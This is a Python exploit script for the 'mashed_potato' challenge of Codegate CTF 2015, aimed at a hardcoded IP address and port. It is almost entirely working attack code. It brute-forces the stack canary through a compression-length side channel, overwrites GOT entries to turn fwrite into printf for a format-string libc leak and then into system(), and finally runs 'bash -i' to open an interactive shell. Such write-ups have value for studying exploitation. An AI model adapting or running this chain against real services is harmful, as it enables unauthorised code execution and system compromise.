#!/usr/bin/env python
#coding: UTF-8
#
# Exploit for 'mashed_potato', Codegate CTF 2015
#
# Copyright (c) 2015 Samuel Groß
#
import struct
import socket
import telnetlib
import time
import sys
import re

TARGET = ('54.178.148.88', 8888)

def e(s):
    return s.encode('UTF-8')

def d(s):
    return s.decode('UTF-8')

def p(d, fmt='<Q'):
    return struct.pack(fmt, d)

def u(d, fmt='<Q'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<Q'):
    return u(d, fmt)[0]

def readtil(delim):
    buf = b''
    while not e(delim) in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.sendall(e(b) + b'\n')

def send(b):
    s.sendall(b)

def pwn():
    global s
    def compress(payload, length):
        sendln('2')
        readtil(': ')
        sendln(str(length))
        readtil(': ')
        send(data)
        r = d(readtil('sent'))
        cs = int(re.search('([0-9]+)', r).group(1))
        readtil(' : ')
        return cs

    s = socket.create_connection(TARGET)
    readtil(' : ')

    l = 505             # offset to the first byte of the stack cookie
    cookie = b'\x00'    # first byte of the cookie is always 0 (to prevent exploitability of strcpy and friends)

    #
    # Brute force first 4 bytes of stack cookie by (ab)using the huffman tree encoding
    #
    for i in range(1, 4):           # we already know the first byte, so start with the second
        val = 0
        for guess in (bytes([i]) for i in range(256)):
            if guess == b'\n' or guess in cookie or guess == b'\x9c' or guess == b'x':      # these seem to cause problems...
                continue

            # payload to "skip" the LZ77 compression and directly target the huffman tree compression
            data  = b''.join(guess + bytes([i]) for i in range(251) if i != 0xa)
            data += (503 - len(data)) * b'\x00'
            data += b'\n'

            cs = compress(data, l + i)
            if val != 0 and val > cs:
                cookie += guess
                print("\n[+] next byte found: {}".format(guess))
                break
            elif val == 0:
                val = cs

            print('.', end='')
            sys.stdout.flush()

        else:
            print("\n[-] failed to guess next byte")
            sys.exit(-1)

    print("[+] got first half: 0x{:x}".format(u1(cookie, '<I')))

    #
    # Brute force the remaining four bytes of the cookie by (ab)using the LZ77 algorithm
    #
    l = 509
    for i in range(0, 4):
        val = 0
        for guess in (bytes([i]) for i in range(256)):
            if guess == b'\n' or guess in cookie:
                continue

            data = b''
            while len(data) <= 503 - len(cookie) - 1:
                data += cookie + guess      # if we guessed correctly, LZ77 will be able to compress the cookie

            data += (503 - len(data)) * b'\x00'
            data += b'\n'

            cs = compress(data, l + i)
            if val != 0 and val > cs:
                cookie += guess
                print("\n[+] next byte found: {}".format(guess))
                break
            elif val == 0:
                val = cs

            print('.', end='')
            sys.stdout.flush()
        else:
            print("\n[-] failed to guess next byte")
            sys.exit(-1)

    print("[+] got cookie: 0x{:x}".format(u1(cookie)))

    #
    # Set main's RBP to point into the GOT
    #
    ret        = 0x0400eed      # return address for 'leave_plain()'
    fwrite_got = 0x602098

    sendln('1')
    readtil(': ')
    sendln('528')
    readtil(': ')
    data  = 504 * b'A' +cookie
    data += p(fwrite_got + 31)          # input buffer is at RBP - 32, use last byte of exit@got (preceding entry) for the menu item number
    data += p(ret)                      # clean return
    send(data + b'\n')

    #
    # Overwrite fwrite@got with printf@plt, then leak stack memory by sending an unencrypted message containing a format string
    #
    send(b'1' + p(0x4008c0))
    readtil(': ')
    payload = ' 0x%93$lx XXX'
    sendln(str(len(payload)))
    readtil(': ')
    sendln(payload)

    r = d(readtil('X'))
    readtil(': ')
    readtil(': ')
    libc_start_main = int(re.search('(0x[0-9a-f]+)', r).group(1), 16)
    print("[+] libc @ 0x{:x}".format(libc_start_main))

    #
    # Overwrite fwrite@got a second time, this time with the address of system()
    #
    # Ubuntu 14.04
    system = 0x46640
    libc_ret = 0x21ec5
    diff = system - libc_ret

    print("[+] system @ 0x{:x}".format(libc_start_main + diff))
    send(b'1' + p(libc_start_main + diff))

    # Send payload to execute
    readtil(': ')
    payload = 'bash -i'
    sendln(str(len(payload)))
    readtil(': ')
    sendln(payload)

    # All done, enjoy
    print("*** interactive ***")
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

pwn()
